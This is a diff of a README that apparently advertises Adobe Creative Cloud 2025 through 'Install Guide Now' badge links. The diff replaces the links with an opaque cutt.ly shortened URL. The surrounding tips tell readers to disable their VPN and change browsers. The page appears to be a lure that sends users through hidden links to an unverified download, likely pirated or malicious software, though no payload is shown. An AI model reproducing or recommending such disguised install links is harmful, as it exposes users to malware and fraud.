@@ -5,7 +5,7 @@
 
 **Description**: Unleash your creativity with **Adobe Creative Cloud 2025**, a premium suite for design, video, and photography! This repository offers tutorials, resources, and tips to explore Creative Cloud’s powerful tools across Photoshop, Illustrator, Premiere Pro, and more. Start with accessible creative resources and join our vibrant community of artists in 2025!  
 
-<a href="https://free-creative-cloud-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/VrNtUXCj" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -35,7 +35,7 @@ Bring your creative projects to life with these easy steps to set up Creative Cl
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.  
 
-<a href="https://free-creative-cloud-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/VrNtUXCj" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
